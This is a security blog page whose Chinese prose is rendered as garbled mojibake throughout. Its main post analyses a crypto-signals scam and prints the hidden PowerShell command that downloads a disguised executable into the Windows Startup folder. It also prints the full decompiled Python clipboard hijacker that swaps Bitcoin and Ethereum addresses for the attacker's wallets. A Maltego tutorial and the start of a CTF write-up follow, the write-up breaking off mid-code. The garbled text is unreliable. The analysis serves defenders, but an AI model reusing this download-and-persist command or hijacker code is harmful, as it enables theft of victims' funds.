<p>é»ä¸‹å»å…¶å¯¦æ˜¯å°å‘ <code>tinyurl.com/cryptorushsignals</code>ï¼Œé€™å€‹çŸ­ç¶²å€åˆæ˜¯å°å‘ <code>https://bbuseruploads.s3.amazonaws.com/7e1f7e0b...</code>ï¼Œæœƒä¸‹è¼‰ <code>CryptoRushSignals.zip</code> ä¸‹ä¾†ã€‚çœ‹èµ·ä¾†å°±å¾ˆå¯ç–‘ï¼Œæ˜æ˜çœ‹èµ·ä¾†æ˜¯è¦å»ä¸€å€‹ç¶²ç«™ï¼Œå»è¼‰äº†æª”æ¡ˆä¸‹ä¾†ã€‚è§£å£“ç¸®è©² zip æª”ä¹‹å¾Œæœ‰å…©å€‹æª”æ¡ˆ <code>HOWTOUSE.txt</code> å’Œ <code>CryptoRushSignals.run.lnk</code>ã€‚</p>
<figure class="highlight plaintext"><figcaption><span>HOWTOUSE.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Open CryptoRushSignals.run, this will open up a website were you can register.</span><br><span class="line">It then automatically will open up an excel sheet with the live current signals.</span><br></pre></td></tr></table></figure>
<p>ç´”æ–‡å­—çš„èªªæ˜æ–‡ä»¶ï¼Œå«ä½ åŸ·è¡Œ <code>CryptoRushSignals.run</code>ï¼ŒçœŸçš„å»åŸ·è¡Œä¹‹å¾Œï¼Œæœƒè·³å‡ºç€è¦½å™¨ç€è¦½ <code>https://t.me/MyCryptoradar</code>ï¼Œè®“ä½ åŠ å…¥ä¸€å€‹ telegram ç¾¤çµ„ï¼Œå°±å¯ä»¥æ”¶åˆ°ä¸€äº›æŒ‡æ¨™æ•¸æ“šçš„è®ŠåŒ–é€šçŸ¥ï¼Œè£¡é¢ç¾åœ¨æœ‰ 400 å¤šäººã€‚</p>
<p align="center"><img data-src="/images/clipboard-hijack-2.png" class=" lazyload"  title="tradingview idea"></p>
<p>é™¤äº†æ‰“é–‹ç€è¦½å™¨å«ä½ åŠ ç¾¤çµ„ä¹‹å¤–ï¼Œä»–é‚„ç§˜å¯†åŸ·è¡Œäº†ä¸‹é¢é€™æ®µ payload</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> [<span class="type">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span class="type">System.Net.SecurityProtocolType</span>]::Tls12; <span class="built_in">Start-Process</span> <span class="literal">-FilePath</span> <span class="string">&quot;https://t.me/MyCryptoradar; Invoke-WebRequest -Uri &quot;</span>https://bitbucket.org/cryptorushh/cryptorush/downloads/pcmoni.png<span class="string">&quot; -OutFile C:\Users\<span class="variable">$env:UserName</span>\AppData\Roaming\Microsoft\Windows\Start` Menu\Programs\Startup\pclp.exe</span></span><br></pre></td></tr></table></figure>
<p>åŸºæœ¬ä¸Šå°±æ˜¯å» bitbucket ä¸‹è¼‰ <code>https://bitbucket.org/cryptorushh/cryptorush/downloads/pcmoni.png</code> é€™å€‹ pngï¼Œç„¶å¾Œæ”¾åˆ°é–‹æ©Ÿè‡ªå‹•åŸ·è¡Œçš„è·¯å¾‘ï¼Œè€Œä¸”é€™å€‹ä¹Ÿä¸æ˜¯ pngï¼Œä»–å°±æ˜¯ä¸€éš» PE åŸ·è¡Œæª”ã€‚</p>
<p align="center"><img data-src="/images/clipboard-hijack-3.png" class=" lazyload"  title="tradingview idea"></p>
<p>ç¨å¾®çœ‹ä¸€ä¸‹é‚£éš» PE åŸ·è¡Œæª”å¾Œï¼Œç™¼ç¾ä»–æ˜¯ç”¨ py2exe åŒ…çš„ï¼Œé‚£å°±ç”¨ <a target="_blank" rel="noopener" href="https://github.com/matiasb/unpy2exe">unpy2exe</a> æ‹†å› pycï¼Œå†ç”¨ <a target="_blank" rel="noopener" href="https://github.com/rocky/python-uncompyle6">uncompyle6</a> å°±å¯ä»¥æ‹†å‡ºåŸæœ¬çš„ python script äº†ã€‚</p>
<figure class="highlight python"><figcaption><span>8.61.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.2</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.15 (default, Dec 23 2019, 14:00:59) </span></span><br><span class="line"><span class="comment"># [GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.4)]</span></span><br><span class="line"><span class="comment"># Embedded file name: 8.61.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2020-08-15 23:23:49</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">oo000 = sys.version_info[<span class="number">0</span>] == <span class="number">2</span></span><br><span class="line">ii = <span class="number">2048</span></span><br><span class="line">oOOo = <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">O0</span>(<span class="params">ll_opy_</span>):</span><br><span class="line">    o0O = <span class="built_in">ord</span>(ll_opy_[(-<span class="number">1</span>)])</span><br><span class="line">    iI11I1II1I1I = ll_opy_[:-<span class="number">1</span>]</span><br><span class="line">    oooo = o0O % <span class="built_in">len</span>(iI11I1II1I1I)</span><br><span class="line">    iIIii1IIi = iI11I1II1I1I[:oooo] + iI11I1II1I1I[oooo:]</span><br><span class="line">    <span class="keyword">if</span> oo000:</span><br><span class="line">        o0OO00 = unicode().join([ unichr(<span class="built_in">ord</span>(oo) - ii - (i1iII1IiiIiI1 + o0O) % oOOo) <span class="keyword">for</span> i1iII1IiiIiI1, oo <span class="keyword">in</span> <span class="built_in">enumerate</span>(iIIii1IIi) ])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        o0OO00 = <span class="built_in">str</span>().join([ <span class="built_in">chr</span>(<span class="built_in">ord</span>(oo) - ii - (i1iII1IiiIiI1 + o0O) % oOOo) <span class="keyword">for</span> i1iII1IiiIiI1, oo <span class="keyword">in</span> <span class="built_in">enumerate</span>(iIIii1IIi) ])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(o0OO00)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time, re, pyperclip, subprocess</span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">    ooOoO0O00 * IIiIiII11i</span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">    oOo0O0Ooo * I1ii11iIi11i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">I1IiI</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            o0OOO = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">                ooOo + Oo</span><br><span class="line">            o0OIiiIII111iI = subprocess.Popen([<span class="string">&#x27;C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#x27;</span>, <span class="string">&#x27;Get-Clipboard&#x27;</span>], stdout=subprocess.PIPE, startupinfo=IiII)</span><br><span class="line">            o0OOO = <span class="built_in">str</span>(o0OIiiIII111iI.stdout.read()).strip().decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">u&#x27;\x00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> o0OOO != iI1Ii11111iIi <span class="keyword">and</span> o0OOO != i1i1II:</span><br><span class="line">                <span class="keyword">if</span> re.match(O0oo0OO0, <span class="built_in">str</span>(o0OOO)):</span><br><span class="line">                    pyperclip.copy(iI1Ii11111iIi)</span><br><span class="line">                    pyperclip.paste()</span><br><span class="line">                <span class="keyword">elif</span> re.match(I1i1iiI1, <span class="built_in">str</span>(o0OOO)):</span><br><span class="line">                    pyperclip.copy(i1i1II)</span><br><span class="line">                    pyperclip.paste()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> iiIIIII1i1iI:</span><br><span class="line">            <span class="built_in">print</span>(iiIIIII1i1iI)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">            o00ooo0 / Oo00O0</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == O0(<span class="string">u&#x27;\u0829\u0862\u0863\u0872\u0867\u0869\u086f\u0861\u0862\u082b\u0805&#x27;</span>):</span><br><span class="line">    i1i1II = <span class="string">&#x27;0x22f338FC26Ea71EC884256C29103122c4578EE27&#x27;</span></span><br><span class="line">    iI1Ii11111iIi = <span class="string">&#x27;14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS&#x27;</span></span><br><span class="line">    O0oo0OO0 = <span class="string">&#x27;^[13][a-km-zA-HJ-NP-Z1-9]&#123;25,34&#125;$&#x27;</span></span><br><span class="line">    I1i1iiI1 = <span class="string">&#x27;^(0x)?[0-9a-fA-F]&#123;40&#125;$&#x27;</span></span><br><span class="line">    time.sleep(<span class="number">15</span>)</span><br><span class="line">    IiII = subprocess.STARTUPINFO()</span><br><span class="line">    IiII.dwFlags |= subprocess.STARTF_USESHOWWINDOW</span><br><span class="line">    I1IiI()</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">        o0oooOoO0</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">        IiIii1Ii1IIi / O0Oooo00.oo00 * I11</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">        I1111 * o0o0Oo0oooo0 / I1I1i1 * oO0 / IIIi1i1I</span><br><span class="line"><span class="comment"># okay decompiling 8.61.py.pyc</span></span><br></pre></td></tr></table></figure>
<p>æœ‰ç¨å¾®æ··æ·†éçš„åŸå§‹ç¢¼ï¼Œé‡æ–°å‘½åä¸€ä¸‹è®Šæ•¸å°±å¯ä»¥äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> time, re, pyperclip, subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            clipboard = <span class="literal">None</span></span><br><span class="line">            process = subprocess.Popen([<span class="string">&#x27;C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#x27;</span>, <span class="string">&#x27;Get-Clipboard&#x27;</span>], stdout=subprocess.PIPE, startupinfo=startupinfo)</span><br><span class="line">            clipboard = <span class="built_in">str</span>(process.stdout.read()).strip().decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">u&#x27;\x00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> clipboard != btc_address <span class="keyword">and</span> clipboard != eth_address:</span><br><span class="line">                <span class="keyword">if</span> re.match(btc_address_pattern, <span class="built_in">str</span>(clipboard)):</span><br><span class="line">                    pyperclip.copy(btc_address)</span><br><span class="line">                    pyperclip.paste()</span><br><span class="line">                <span class="keyword">elif</span> re.match(eth_address_pattern, <span class="built_in">str</span>(clipboard)):</span><br><span class="line">                    pyperclip.copy(eth_address)</span><br><span class="line">                    pyperclip.paste()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            <span class="built_in">print</span>(err)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    eth_address = <span class="string">&#x27;0x22f338FC26Ea71EC884256C29103122c4578EE27&#x27;</span></span><br><span class="line">    btc_address = <span class="string">&#x27;14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS&#x27;</span></span><br><span class="line">    btc_address_pattern = <span class="string">&#x27;^[13][a-km-zA-HJ-NP-Z1-9]&#123;25,34&#125;$&#x27;</span></span><br><span class="line">    eth_address_pattern = <span class="string">&#x27;^(0x)?[0-9a-fA-F]&#123;40&#125;$&#x27;</span></span><br><span class="line">    time.sleep(<span class="number">15</span>)</span><br><span class="line">    startupinfo = subprocess.STARTUPINFO()</span><br><span class="line">    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>ä»–æŠŠä½ å‰ªè²¼ç°¿è£¡é¢ç¬¦åˆ bitcoin æˆ– ethereum åœ°å€æ ¼å¼çš„é€šé€šæ›æˆä»–éŒ¢åŒ…çš„ä½å€ã€‚</p>
<h2 id="IOC">IOC</h2>
<ul>
<li>0x22f338FC26Ea71EC884256C29103122c4578EE27</li>
<li>14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS</li>
</ul>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/08/16/clipboard-hijack/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-07-30T16:00:00.000Z" title="7/31/2020, 12:00:00 AM">2020-07-31</time></span><i class="material-icons">schedule</i><span class="level-item">4 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">è³‡å®‰</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/07/31/maltego/">ã€å·¥å…·ä»‹ç´¹ã€‘Maltego</a></h1><div class="content"><p>Maltego æ˜¯ç”¨ä¾†è‡ªå‹•åŒ–æƒ…è³‡è’é›†çš„å·¥å…·ã€‚</p>
<h2 id="åŸºæœ¬ä»‹ç´¹">åŸºæœ¬ä»‹ç´¹</h2>
<p>ä¸€é–‹å§‹å°±æŒ‰ Creat a new graph æ–°å¢ä¸€å€‹å·¥ä½œçš„åœ–å±¤ï¼Œå°±å¯ä»¥åœ¨ä¸Šé¢ç•«å‡ºé—œä¿‚åœ–ã€‚<br>
Entities æ˜¯åŸºæœ¬ç‰©ä»¶ï¼Œæœ‰å¾ˆå¤šç¨®é¡å‹æ¯”å¦‚ Company, Organization, Domain, Website, â€¦ï¼Œæ¯å€‹ç‰©ä»¶éƒ½æœ‰å¹¾å€‹å±¬æ€§æ¬„ä½ï¼Œå‡è¨­ä½ æ‹¿åˆ°æŸå€‹äººçš„æ‰‹æ©Ÿè™Ÿç¢¼ï¼Œé‚£å¯ä»¥å¾æ—é‚Š Entity Palette æ‹–æ›³ä¸€å€‹ Phone Number åˆ°å³é‚Šç©ºç™½è™•ã€‚<br>
Transforms å°±æ˜¯ä¸€å€‹å¯ä»¥é‡è¤‡ä½¿ç”¨çš„å‡½å¼ï¼Œæ¯”å¦‚å·²ç¶“æœ‰äº†æ‰‹æ©Ÿè™Ÿç¢¼ï¼Œé‚£å°±å»æŸå€‹ç¶²ç«™ä¸Šçˆ¬æ‰‹æ©Ÿè™Ÿç¢¼å°æ‡‰çš„åœ‹å®¶ä¹‹é¡çš„ï¼ŒæŠŠé€™å€‹çˆ¬çš„æ­¥é©Ÿå¯«æˆä¸€å€‹ transformï¼Œå°±å¯ä»¥è‡ªå‹•åŒ–å»å¾å·²çŸ¥çš„è³‡æ–™ç”Ÿæ›´å¤šç›¸é—œçš„è³‡æ–™ã€‚Local Transform æ˜¯è‡ªå·±å¯«çš„å‡½å¼ï¼Œä¹Ÿæœ‰åˆ¥äººå¯«å¥½çš„åœ¨ Transform Hub ä¸Šé¢ã€‚</p>
<h2 id="Local-Transforms">Local Transforms</h2>
<p>è·Ÿè‘—å®˜æ–¹æ–‡ä»¶ <a target="_blank" rel="noopener" href="https://docs.maltego.com/support/solutions/articles/15000017605-local-transforms-example-">maltego docs</a> åšå°±å¯ä»¥å¤§æ¦‚äº†è§£æ€éº¼ç”¨ python å»å¯« Local Transforms äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install maltego-trx</span><br><span class="line">maltego-trx start new_project</span><br></pre></td></tr></table></figure>
<p>å…ˆå®‰è£ python å¥—ä»¶ï¼Œå†ç”¨ <code>maltego-trx</code> å»åˆå§‹åŒ–ä¸€å€‹ project</p>
<figure class="highlight python"><figcaption><span>transforms/TaxIDToCompany.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> maltego_trx.entities <span class="keyword">import</span> Person</span><br><span class="line"><span class="keyword">from</span> maltego_trx.transform <span class="keyword">import</span> DiscoverableTransform</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TaxIDToCompany</span>(<span class="title class_ inherited__">DiscoverableTransform</span>):</span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_entities</span>(<span class="params">cls, request, response</span>):</span><br><span class="line">        taxid = request.Properties[<span class="string">&#x27;properties.taxid&#x27;</span>]</span><br><span class="line">        r = requests.get(<span class="string">f&#x27;http://company.g0v.ronny.tw/api/show/<span class="subst">&#123;taxid&#125;</span>&#x27;</span>)</span><br><span class="line">        result = json.loads(r.text)</span><br><span class="line">        response.addEntity(<span class="string">&#x27;maltego.Company&#x27;</span>, result[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;å…¬å¸åç¨±&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p>ä¸»è¦å°±æ˜¯ç¹¼æ‰¿ <code>DiscoverableTransform</code> ç„¶å¾Œå¡«å¯« <code>create_entities</code> é€™å€‹å‡½å¼ï¼Œrequest è£¡é¢å°±æœ‰åŸ·è¡Œ transform çš„é‚£å€‹ entity çš„è³‡è¨Šï¼Œç„¶å¾Œé€™è£¡æ˜¯ç”¨çµ±ä¸€ç·¨è™Ÿ ( TaxID ) å»æ‰¾å…¬å¸åç¨±ï¼Œç„¶å¾Œæ–°å¢ä¸€å€‹å…¬å¸çš„ Entityã€‚<br>
åŸæœ¬æ²’æœ‰ TaxID é€™å€‹ Entity è¦å…ˆå» New Entity Type æ–°å¢ä¸€å€‹ TaxIDã€‚<br>
<code>company.g0v.ronny.tw</code> å›å‚³çš„è³‡è¨Šæœ‰å¾ˆå¤šï¼Œå¯ä»¥æŠŠé‚£äº›è³‡è¨Šéƒ½åŠ é€²ä¾†ï¼Œå¯æ˜¯æˆ‘å°±æ‡¶ã€‚</p>
<p>å¯«å®Œä¹‹å¾Œè¦æŠŠ Local Transform åŠ é€²å»ï¼Œæœ‰å¹¾å€‹æ¬„ä½è¦æ³¨æ„ï¼Œ</p>
<ol>
<li>Input entity type : è¦å¡«é€™å€‹ transform è¦å°å“ªä¸€ç¨® entity åšæ“ä½œ</li>
<li>Command : æˆ‘å€‘æ˜¯ç”¨ python api æ‰€ä»¥è¦å¡« python çš„ PATHï¼Œåœ¨ linux ä¸Šå¯ä»¥ç”¨ <code>which python</code> æ‰¾</li>
<li>Parameters : å¡« <code>project.py local TaxIDToCompany</code>ï¼Œ<code>project.py</code> æ˜¯åˆå§‹åŒ– project å®Œæœƒç”¢ç”Ÿçš„è…³æœ¬ï¼Œ<code>local</code> æŒ‡çš„å°±æ˜¯ Local Transformï¼Œ<code>TaxIDToCompany</code> æ˜¯ä½  transform çš„åå­—ï¼Œå°±æ˜¯é‚£å€‹æª”åçš„éƒ¨åˆ†å§</li>
<li>Working directory: Project çš„è·¯å¾‘ï¼Œå°±æ˜¯è¦æœ‰ <code>project.py</code> çš„é‚£å€‹åœ°æ–¹</li>
</ol>
<p>æœ€å¾ŒæŒ‰ä¸‹ Run è·‘å®Œ transform ä¹‹å¾Œï¼Œå°±æœƒè‡ªå‹•æ–°å¢ä¸€å€‹ Company çš„ Entityã€‚</p>
<p align="center"><img data-src="/images/maltego-result.png" class=" lazyload"  title="maltego result"></p>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/07/31/maltego/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-06-08T16:00:00.000Z" title="6/9/2020, 12:00:00 AM">2020-06-09</time></span><i class="material-icons">schedule</i><span class="level-item">39 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">è³‡å®‰</a><span>Â /Â </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/writeups/">writeups</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/06/09/ais3-2020-preexam/">ã€CTF Writeupsã€‘AIS3 pre-exam 2020</a></h1><div class="content"><p>é€™å­¸æœŸä¿®äº†ç¶²è·¯æ”»é˜²å¯¦ç¿’ï¼Œé€™å ‚èª²è¦ç”¨ AIS3 Pre-Exam ç•¶æœŸæœ«è€ƒï¼Œå¥½å–”ã€‚</p>
<p align="center"><img data-src="/images/ais3-scores.png" class=" lazyload"  width="500" title="AIS3 Pre-Exam Scores"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/OAlienO/CTF/tree/master/2020/AIS3-pre-exam">æ”»æ“Šè…³æœ¬å€‘åœ¨é€™</a></p>
<h2 id="Misc">Misc</h2>
<h3 id="Piquero">Piquero</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å¼µé»å­—çš„åœ–ï¼Œåªè¦å…ˆæ‰¾åˆ°å‡ºé¡Œè€…ç”¨çš„ generator <a target="_blank" rel="noopener" href="https://www.mathsisfun.com/braille-translation.html">é€™å€‹</a>ï¼Œæ¥è‘—å°±ä¸€å€‹ä¸€å€‹å°ç…§å°±è§£å‡ºä¾†äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;I_feel_sleepy_Good_Night!!!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Karuego">Karuego</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å¼µ pngï¼Œå…ˆç”¨ <code>binwalk --dd=&quot;.*&quot; Karuego.png</code> æ‹‰å‡ºä¸€å€‹ zip æª”ï¼Œé€™å€‹ zip æª”æœ‰åŠ å¯†ï¼ŒåŸæœ¬æƒ³ç”¨ <code>fcrackzip</code> ä¹‹é¡çš„çˆ†ç ´å·¥å…·ï¼Œä½† <code>zsteg -a Karuego.png</code> ä¸‹å»ç™¼ç¾ LSB æœ‰ä¸€æ®µæ–‡å­— <code>The key is : lafire</code>ï¼Œzip æª”è§£é–‹è£¡é¢æœ‰ä¸€å¼µ <code>Demon.png</code> æ‰“é–‹å°±çœ‹åˆ° flag äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Ar3_y0u_r34l1y_r34dy_t0_sumnn0n_4_D3m0n?&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Soy">Soy</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å¼µ pngï¼Œæ˜¯è¢«å¢¨æ¼¬æ±¡æŸ“çš„ QR Codeï¼Œæˆ‘ç”¨ <code>https://merricx.github.io/qrazybox/</code> æŠŠå·²çŸ¥çš„é»‘é»ç™½é»éƒ½ç•«äº†ä¸Šå»å°±è§£å‡ºä¾†äº†ï¼Œå› ç‚ºå¤§éƒ¨åˆ†çš„ Data å€å¡Šéƒ½æ²’è¢«æ±¡æŸ“åˆ°å§ï¼Œé€™å€‹ç¶²ç«™ä¸Šç•« QR Code çš„æ™‚å€™è¨˜å¾—è¦ç•«ç™½é»ï¼Œä¸è¦åªç•«é»‘é»ï¼Œæ²’ç•«çš„æœƒæ˜¯æœªçŸ¥çš„ç°é»ï¼Œæˆ‘åœ¨é€™è£¡å¡å¾ˆä¹…Q</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;H0w_c4n_y0u_f1nd_me?!?!?!!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Saburo">Saburo</h3>
<p>é€™é¡Œè¦ <code>nc 60.250.197.227 11001</code>ï¼Œæ²’çµ¦åŸå§‹ç¢¼ï¼Œé€£ä¸Šå»è¦è¼¸å…¥ flag çµ¦ä»–ï¼Œä»–æœƒè¼¸å‡ºä½ å¹¾ç§’å¾Œè¼¸äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flag: A</span><br><span class="line">Haha, you lose in 24 milliseconds.</span><br></pre></td></tr></table></figure>
<p>çŒœæ¸¬æ˜¯ Side Channel Attackï¼ŒåŸå§‹ç¢¼çŒœæ¸¬å¤§æ¦‚æ˜¯ ( ä¸è² è²¬ä»»äº‚å¯« code å¦‚ä¸‹ )</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare</span>(<span class="params">real_flag, user_flag</span>):</span><br><span class="line">    l = <span class="built_in">len</span>(user_flag) <span class="keyword">if</span> <span class="built_in">len</span>(user_flag) &lt; <span class="built_in">len</span>(real_flag) <span class="keyword">else</span> <span class="built_in">len</span>(real_flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(user_flag)):</span><br><span class="line">        <span class="keyword">if</span> user_flag[i] != real_flag[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> i == <span class="built_in">len</span>(user_flag) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">real_flag = <span class="string">&#x27;AIS3&#123;...&#125;&#x27;</span></span><br><span class="line">user_flag = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">start = time.clock()</span><br><span class="line">win = compare(real_flag, user_flag)</span><br><span class="line">end = time.clock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> win:</span><br><span 